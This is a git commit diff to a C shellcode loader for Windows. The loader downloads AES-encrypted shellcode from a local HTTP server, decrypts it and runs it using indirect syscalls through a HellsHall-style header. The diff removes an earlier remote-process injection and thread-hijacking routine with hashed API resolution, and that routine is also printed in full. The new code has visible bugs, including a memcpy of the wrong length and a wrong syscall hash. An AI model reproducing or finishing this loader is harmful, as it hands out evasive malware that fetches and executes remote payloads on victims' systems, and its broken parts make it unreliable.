afd562ae4d58bece4dd6877e1fd28a15e105006f
bravosixgoingdark <minhnhatbg05@gmail.com>
2026-04-10 07:53:28 +0700

    Add rough code for now

--- Djb2A_hash.c
+++ Djb2A_hash.c
@@ -11,22 +11,15 @@ DWORD HashStringDjb2W(IN LPCSTR String)
 
 	return Hash;
 }
+
 int main() {
 
+	printf("#define NtAllocateVirtualMemory_Djb2W 0x%0.8X \n", HashStringDjb2W("NtAllocateVirtualMemory"));
+	printf("#define NtProtectVirtualMemory_Djb2W 0x%0.8X \n", HashStringDjb2W("NtProtectVirtualMemory"));
+	printf("#define NtWriteVirtualMemory_Djb2W 0x%0.8X \n", HashStringDjb2W("NtWriteVirtualMemory"));
+	printf("#define NtCreateThreadEx_Djb2W 0x%0.8X \n", HashStringDjb2W("NtCreateThreadEx"));
+	printf("#define NtWaitForSingleObject_Djb2W 0x%0.8X \n", HashStringDjb2W("NtWaitForSingleObject"));
 
-    wprintf(L"#define HASH_CreateProcessA 0x%0.8X \n", HashStringDjb2W("CreateProcessA"));
-
-    wprintf(L"#define HASH_VirtualAllocEx 0x%0.8X \n", HashStringDjb2W("VirtualAllocEx"));
-
-    wprintf(L"#define HASH_WriteProcessMemory 0x%0.8X \n", HashStringDjb2W("WriteProcessMemory"));
-
-    wprintf(L"#define HASH_VirtualProtectEx 0x%0.8X \n", HashStringDjb2W("VirtualProtectEx"));
-
-    wprintf(L"#define HASH_GetThreadContext 0x%0.8X \n", HashStringDjb2W("GetThreadContext"));
-
-    wprintf(L"#define HASH_SetThreadContext 0x%0.8X \n", HashStringDjb2W("SetThreadContext"));
-
-    wprintf(L"#define HASH_KERNEL32_DLL 0x%0.8X \n", HashStringDjb2W("KERNEL32.DLL"));
 
 	printf("[#] Press <Enter> To Quit ... ");
 	getchar();
--- main.c
+++ main.c
@@ -4,21 +4,22 @@
 #include <wininet.h>
 #include "aes.h"
 #include <winternl.h>
+#include "HellsHall.h"
 
-#define HASH_CreateProcessA 0xAEB52E19
-#define HASH_VirtualAllocEx 0xF36E5AB4
-#define HASH_WriteProcessMemory 0x6F22E8C8
-#define HASH_VirtualProtectEx 0xD812922A
-#define HASH_GetThreadContext 0xEBA2CFC2
-#define HASH_SetThreadContext 0x7E20964E
-#define HASH_KERNEL32_DLL 0x6DDB9555
-
-
+#define NtAllocateVirtualMemory_CRC32    0x498165AA
+#define NtProtectVirtualMemory_CRC32     0x17C9087B
+#define NtWriteVirtualMemory_CRC32       0xF7C5A233
+#define NtCreateThreadEx_CRC32			 0x6411D915
+#define NtWaitForSingleObject_CRC32      0x3D93EDA4
+#define NtSuspendThread_CRC32		0xD7288A6E
+#define NtGetContextThread_CRC32    0xC402D0FC
+#define NtSetContextThread_CRC32    0xF614A2E5
+#define NtResumeThread_CRC32		0xD67413A8
 
 // import wininet.lib
 
 #pragma comment (lib, "Wininet.lib")
-#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode.bin"
+#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode_adaptix.bin"
 #define TARGET_PROCESS "Notepad.exe"
 // basic shellcode loader that have the shellcode embedded within the file
 
@@ -26,8 +27,46 @@
 
 #define DEBUG
 
+typedef struct _NTAPI_FUNC
+{
+	NT_SYSCALL	NtAllocateVirtualMemory;
+	NT_SYSCALL	NtProtectVirtualMemory;
+	NT_SYSCALL	NtWriteVirtualMemory;
+	NT_SYSCALL	NtWaitForSingleObject;
+    NT_SYSCALL  NtCreateThreadEx;
+
+}NTAPI_FUNC, * PNTAPI_FUNC;
+
+NTAPI_FUNC S = { 0 };
 
 // defining the API that we want to import using custom GetModuleHandle and GetProcAddress on runtime
+
+BOOL InitializeNtSyscalls() {
+
+	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &S.NtAllocateVirtualMemory)) {
+		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
+		return FALSE;
+	}
+
+	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &S.NtProtectVirtualMemory)) {
+		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
+		return FALSE;
+	}
+
+	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &S.NtWaitForSingleObject)) {
+		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
+		return FALSE;
+	}
+	if (!FetchNtSyscall(NtSuspendThread_CRC32, &S.NtCreateThreadEx)) {
+		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx\n");
+		return FALSE;
+	}
+	if (!FetchNtSyscall(NtSuspendThread_CRC32, &S.NtWriteVirtualMemory)) {
+		printf("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory\n");
+		return FALSE;
+	}
+
+}
 
 typedef BOOL (WINAPI* fnCreateProcessA)(
     IN LPCSTR lpApplicationName,
@@ -42,41 +81,6 @@ typedef BOOL (WINAPI* fnCreateProcessA)(
     OUT LPPROCESS_INFORMATION lpProcessInformation
 );
 
-typedef LPVOID (WINAPI* fnVirtualAllocEx)(
-    IN HANDLE hProcess,
-    IN LPVOID lpAddress,
-    IN SIZE_T dwSize,
-    IN DWORD flAllocationType,
-    IN DWORD flProtect
-);
-
-typedef BOOL (WINAPI* fnWriteProcessMemory)(
-    IN HANDLE hProcess,
-    IN LPVOID lpBaseAddress,
-    IN LPCVOID lpBuffer,
-    IN SIZE_T nSize,
-    OUT SIZE_T* lpNumberOfBytesWritten
-);
-
-typedef BOOL (WINAPI* fnVirtualProtectEx)(
-    IN HANDLE hProcess,
-    IN LPVOID lpAddress,
-    IN SIZE_T dwSize,
-    IN DWORD flNewProtect,
-    OUT PDWORD lpflOldProtect
-);
-
-typedef BOOL (WINAPI* fnGetThreadContext)(
-    IN HANDLE hThread,
-    IN OUT LPCONTEXT lpContext
-);
-
-typedef BOOL (WINAPI* fnSetThreadContext)(
-    IN HANDLE hThread,
-    IN CONST CONTEXT* lpContext
-);
-
-
 
 DWORD HashStringDjb2A(_In_ LPCSTR String)
 {
@@ -89,89 +93,6 @@ DWORD HashStringDjb2A(_In_ LPCSTR String)
 	return Hash;
 }
 
-
-HMODULE GetModuleHandleCustom(DWORD dwModuleNameHash) {
-
-	if (dwModuleNameHash == NULL)
-		return NULL;
-
-#ifdef _WIN64
-	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
-#elif _WIN32
-	PPEB      pPeb = (PEB*)(__readfsdword(0x30));
-#endif
-
-	PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb->Ldr);
-	PLDR_DATA_TABLE_ENTRY	pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
-
-	while (pDte) {
-
-		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
-
-			// Converting `FullDllName.Buffer` to upper case string
-			CHAR UpperCaseDllName[MAX_PATH];
-
-			DWORD i = 0;
-			while (pDte->FullDllName.Buffer[i]) {
-				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
-				i++;
-			}
-			UpperCaseDllName[i] = '\0';
-
-			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
-			if (HashStringDjb2A(UpperCaseDllName) == dwModuleNameHash)
-				return pDte->Reserved2[0];
-
-		}
-		else {
-			break;
-		}
-
-		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
-	}
-
-	return NULL;
-}
-
-
-
-FARPROC GetProcAddressCustom(HMODULE hModule, DWORD dwApiNameHash) {
-
-	if (hModule == NULL || dwApiNameHash == NULL)
-		return NULL;
-
-	PBYTE pBase = (PBYTE)hModule;
-
-	PIMAGE_DOS_HEADER         pImgDosHdr			  = (PIMAGE_DOS_HEADER)pBase;
-	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
-		return NULL;
-
-	PIMAGE_NT_HEADERS         pImgNtHdrs			  = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
-	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
-		return NULL;
-
-	IMAGE_OPTIONAL_HEADER     ImgOptHdr			  = pImgNtHdrs->OptionalHeader;
-
-	PIMAGE_EXPORT_DIRECTORY   pImgExportDir		  = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-
-	PDWORD  FunctionNameArray	= (PDWORD)(pBase + pImgExportDir->AddressOfNames);
-	PDWORD  FunctionAddressArray	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
-	PWORD   FunctionOrdinalArray	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
-
-	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
-		CHAR*	pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
-		PVOID	pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
-
-		// Hashing every function name pFunctionName
-		// If both hashes are equal then we found the function we want
-		if (dwApiNameHash == HashStringDjb2A(pFunctionName)) {
-			return pFunctionAddress;
-		}
-	}
-
-	return NULL;
-}
 
 BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
 
@@ -252,14 +173,14 @@ BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
 }
 
 
-
 unsigned char AesKey[] = {
-	0xFA, 0xD7, 0x41, 0xEE, 0x57, 0x3C, 0xDA, 0x0C, 0x85, 0x5B, 0xCC, 0x8F, 0x33, 0xEF, 0x70, 0xBC,
-	0x9F, 0x13, 0x0E, 0x0E, 0x67, 0xBC, 0x4D, 0xDB, 0x9D, 0x87, 0xEE, 0x35, 0x19, 0xB5, 0xBA, 0x0F };
+	0xAC, 0x85, 0x0C, 0xAD, 0xDB, 0x0F, 0x69, 0xED, 0x58, 0x21, 0xD8, 0xEE, 0xA7, 0x7E, 0x24, 0x24,
+	0xFB, 0xDD, 0x34, 0xA4, 0xA9, 0x90, 0x28, 0xE3, 0xDB, 0x65, 0xA5, 0xC1, 0x89, 0xCA, 0x6C, 0xC6 };
 
 
 unsigned char AesIv[] = {
-	0x42, 0x88, 0x75, 0xDF, 0xC0, 0xB1, 0x54, 0x7C, 0x7C, 0x01, 0x16, 0x58, 0xC2, 0xE3, 0x94, 0xBA };
+	0x0D, 0x01, 0x7F, 0x63, 0x51, 0xA6, 0x7A, 0xFB, 0x2C, 0x69, 0x73, 0x83, 0x7E, 0xF9, 0x75, 0xA6 };
+
 // for debugging only
 
 VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
@@ -295,155 +216,6 @@ BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE 
 	return TRUE;
 }
 
-BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread ) {
-
-    fnCreateProcessA pCreateProcessA = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_CreateProcessA);
-
-    CHAR lpPath [MAX_PATH * 2];
-    CHAR WinDirectory [MAX_PATH];
-
-    // STARTUPINFO struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
-    STARTUPINFO Si = { 0 };
-
-    // PROCESS_INFORMATION struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
-    // typedef struct _PROCESS_INFORMATION {
-    //  HANDLE hProcess;
-    //  HANDLE hThread;
-    //  DWORD  dwProcessId;
-    //  DWORD  dwThreadId;
-    //} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
-
-    PROCESS_INFORMATION Pi = { 0 };
-
-
-    // Wipe the structs to be sure
-    RtlSecureZeroMemory( &Si , sizeof(STARTUPINFO));
-    RtlSecureZeroMemory(&Pi, sizeof(ProcessorInformation));
-
-    Si.cb = sizeof(STARTUPINFO);
-
-    // Get the name of the %WINDIR% variable to determine the exact location of a file
-
-    if (!GetEnvironmentVariableA("WINDIR", WinDirectory, MAX_PATH)) {
-        #ifdef DEBUG
-        printf("[!] GetEnviromentVariableA failed with error: %d \n", GetLastError());
-        #endif
-        return FALSE;
-    }
-    // Creating the full path for the executable
-    sprintf(lpPath, "%s\\System32\\%s", WinDirectory, lpProcessName);
-    #ifdef DEBUG
-    printf("[i] Running : \"%s\" ... ", lpPath);
-    #endif
-    if (!pCreateProcessA(
-        NULL, // not needed
-        lpPath, // full path of the executable
-        NULL, // not needed
-        NULL, // not needed
-        FALSE, // set inherit to False
-        CREATE_SUSPENDED, // important: set process to start suspended
-        NULL, // not needed unless there's something about environment
-        NULL, // idk
-        &Si, // pointer to the STARTUPINFO struct
-        &Pi // Pointer to the PROCESSINFO struct
-    )) {
-
-        #ifdef DEBUG
-        printf("[!] CreateProcessA failed to create process %s at %s with error: %d\n ", lpProcessName, lpPath, GetLastError());
-        #endif
-        return FALSE;
-    }
-
-    #ifdef DEBUG
-    printf("[+] Done\n");
-    #endif
-
-    // return PID, Process and thread handle
-    *dwProcessId = Pi.dwProcessId;
-    *hProcess = Pi.hProcess;
-    *hThread  = Pi.hThread;
-
-    // Ensure that we got everything we need
-    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
-		return TRUE;
-
-    // else return false
-    return FALSE;
-}
-
-BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pShellcodeAddress) {
-
-    fnVirtualAllocEx pVirtualAllocEx = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_VirtualAllocEx);
-
-    fnWriteProcessMemory pWriteProcessMemory = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_WriteProcessMemory);
-
-    fnVirtualProtectEx pVirtualProtectEx = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_VirtualProtectEx);
-
-    SIZE_T lpNumberOfBytesWritten = 0;
-    DWORD dwOldProtection = 0;
-
-    *pShellcodeAddress = pVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory the size of the shellcode inside of the remote process
-
-    if (*pShellcodeAddress == NULL) {
-        #ifdef DEBUG
-        printf("[!] VirtualAllocEx failed with error : %d\n", GetLastError());
-        #endif
-        return FALSE;
-    }
-
-    #ifdef DEBUG
-    printf("\n[!] pShellcodeAddress allocated at 0x%p of Size %d\n", *pShellcodeAddress, sSizeOfShellcode);
-    #endif
-    if (!pWriteProcessMemory(hProcess, *pShellcodeAddress, pShellcode, sSizeOfShellcode, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != sSizeOfShellcode) {
-        #ifdef DEBUG
-        printf("[!] WriteProcessMemory failed with error : %d\n", GetLastError());
-        #endif
-        return FALSE;
-    }
-
-    memset(pShellcode, '\0', sSizeOfShellcode);
-
-    if (!pVirtualProtectEx(hProcess, *pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-        printf("[!] VirtualProtect failed with error : %d\n", GetLastError());
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {
-
-    fnGetThreadContext pGetThreadContext =
-        GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_GetThreadContext);
-
-    fnSetThreadContext pSetThreadContext =
-        GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_SetThreadContext);
-
-    CONTEXT ThreadContext = {
-        .ContextFlags =  CONTEXT_CONTROL
-    };
-
-    // Get thread information
-    if (!pGetThreadContext(hThread, &ThreadContext)) {
-        #ifdef DEBUG
-        printf("[!] GetThreadContext failed with error: %d\n", GetLastError());
-        #endif
-        return FALSE;
-    }
-    // Hijack target address
-    ThreadContext.Rip = pAddress;
-
-    // Write thread
-    if (!pSetThreadContext(hThread, &ThreadContext)) {
-        #ifdef DEBUG
-        printf("[!] SetThreadContext failed with error: %d\n", GetLastError());
-        #endif
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
 int main(int argc, char* argv[]) {
     PBYTE pEncrypted = NULL;
     size_t sSizeOfPayload = 0;
@@ -452,13 +224,13 @@ int main(int argc, char* argv[]) {
     HANDLE hProcess = NULL;
     HANDLE hThread = NULL;
     PVOID pShellcodeAddress = NULL;
+    NTSTATUS STATUS = 0x00;
+
+    if (!InitializeNtSyscalls()) {
+        return -1;
+    }
 
     // 1: Get encrypted payload
-
-    if (LoadLibraryA("KERNEL32.DLL") == NULL) {
-		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
-		return 0;
-	}
 
     if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
         #ifdef DEBUG
@@ -469,6 +241,12 @@ int main(int argc, char* argv[]) {
 
     // 2: Decrypt Payload
 
+    #ifdef DEBUG
+    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
+    PrintHexData("AESKey", AesKey, sizeof(AesKey));
+    printf("[+] Press Enter to continue......");
+    getchar();
+    #endif
 
     if (!DecryptAES(pEncrypted, sSizeOfPayload, AesKey, AesIv)) {
         #ifdef DEBUG
@@ -478,28 +256,36 @@ int main(int argc, char* argv[]) {
     }
 
     #ifdef DEBUG
-    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
+    PrintHexData("pDecrypted", pEncrypted, sSizeOfPayload);
+    printf("[+] Press Enter to continue......");
+    getchar();
     #endif
 
 
-    // 3: Create suspended process to inject payload to
-    if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) return -1;
+    SET_SYSCALL(S.NtAllocateVirtualMemory);
+    if ((STATUS = RunSyscall((HANDLE)-1, &pShellcodeAddress, 0, &sSizeOfPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
+        printf("[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
+        return -1;
+    }
 
-    // 4: Inject payload to suspended process
-    if (!InjectShellcodeToRemoteProcess(hProcess, pEncrypted, sSizeOfPayload, &pShellcodeAddress)) return -1;
+    printf("[+] pAddress : 0x%p \n", pShellcodeAddress);
 
-    // 5: Hijack thread execution to point to shellcode within the process
 
-    if (!HijackThreadExecution(hThread, pShellcodeAddress)) return -1;
+    memcpy(pShellcodeAddress, pEncrypted, sizeof(pEncrypted));
 
-    // 6: Resume thread
 
-    ResumeThread(hThread);
+    SET_SYSCALL(S.NtProtectVirtualMemory);
+    if ((STATUS = RunSyscall((HANDLE)-1, &pShellcodeAddress, &sSizeOfPayload, PAGE_EXECUTE_READ, &flOldProtect)) != 0x0) {
+        printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
+        return -1;
+    }
 
-    #ifdef DEBUG
-    printf("[+] Executing payload with PID: %d\n", dwProcessId);
-    #endif
+    SET_SYSCALL(S.NtCreateThreadEx);
 
+    if ((STATUS = RunSyscall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, pShellcodeAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
+		printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
+		return -1;
+	}
 
     return 0;
 }
